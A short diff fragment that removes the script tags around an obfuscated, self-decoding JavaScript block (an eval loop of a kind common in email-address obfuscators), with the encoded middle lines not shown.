@@ -1,4 +1,3 @@
-<script type="text/javascript">
 //<![CDATA[
 <!--
 var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
@@ -47,4 +46,4 @@ var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
 while(x=eval(x));
 //-->
 //]]>
-</script>
+
